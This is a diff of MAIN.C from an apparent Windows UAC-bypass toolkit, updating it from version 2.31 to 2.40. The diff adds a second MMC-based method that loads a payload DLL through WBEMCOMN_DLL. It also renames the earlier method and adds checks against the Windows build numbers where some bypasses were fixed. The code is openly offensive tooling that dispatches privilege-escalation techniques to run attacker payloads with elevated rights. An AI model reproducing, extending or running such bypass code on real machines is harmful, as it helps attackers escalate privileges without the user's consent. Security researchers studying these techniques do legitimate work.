@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.31
+*  VERSION:     2.40
 *
-*  DATE:        23 June 2016
+*  DATE:        01 July 2016
 *
 *  Program entry point.
 *
@@ -227,6 +227,9 @@ UINT ucmInit(
         case UacMethodAVrf:
             dwType = HIBIKI_ID;
             break;
+       /* case UacMethod21:
+            dwType = HATSUYUKI_ID;
+            break;*/
         default:
             dwType = FUBUKI_ID;
             break;
@@ -395,7 +398,7 @@ UINT ucmMain()
 #endif
         break;
 
-    case UacMethodMMC:
+    case UacMethodMMC1:
 #ifndef _WIN64
         ucmShowMessage(WIN64ONLY);
         return ERROR_UNSUPPORTED_TYPE;
@@ -444,9 +447,9 @@ UINT ucmMain()
             ucmShowMessage(WINBLUEWANTED);
             return ERROR_UNSUPPORTED_TYPE;
         }
-        
+
         //fixed in 14371
-        if (g_ctx.dwBuildNumber > 14367) { 
+        if (g_ctx.dwBuildNumber > 14367) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
         }
@@ -455,7 +458,7 @@ UINT ucmMain()
     case UacMethodManifest:
 
         //fixed in 14371
-        if (g_ctx.dwBuildNumber > 14367) { 
+        if (g_ctx.dwBuildNumber > 14367) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
         }
@@ -465,9 +468,22 @@ UINT ucmMain()
 #ifndef _WIN64
         ucmShowMessage(WIN64ONLY);
         return ERROR_UNSUPPORTED_TYPE;
+#else 
+        //fixed in 14376
+        if (g_ctx.dwBuildNumber > 14372) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
 #endif
         break;
 
+    case UacMethodMMC2:
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#else
+#endif
+        break;
     }
 
     //prepare command for payload
@@ -589,14 +605,14 @@ UINT ucmMain()
         }
         break;
 
-    case UacMethodMMC:
+    case UacMethodMMC1:
 #ifndef _DEBUG
         if (g_ctx.IsWow64) {
             ucmShowMessage(WOW64STRING);
             return ERROR_UNSUPPORTED_TYPE;
         }
 #endif
-        if (ucmMMCMethod(ELSEXT_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+        if (ucmMMCMethod(UacMethodMMC1, ELSEXT_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
             return ERROR_SUCCESS;
         }
         break;
@@ -664,16 +680,21 @@ UINT ucmMain()
         }
         break;
 
-        //allow only in win64 version
+//allow only in win64 version because of laziness
 #ifdef _WIN64
     case UacMethodInetMgr:
-
-        OutputDebugString(L"[UCM] Please be patient, this can take some time due to a file scan");
         if (ucmInetMgrMethod()) {
             return ERROR_SUCCESS;
         }
         break;
+
+    case UacMethodMMC2:
+        if (ucmMMCMethod(UacMethodMMC2, WBEMCOMN_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+            return ERROR_SUCCESS;
+        }
+        break;
 #endif
+
     }
 
     return ERROR_ACCESS_DENIED;
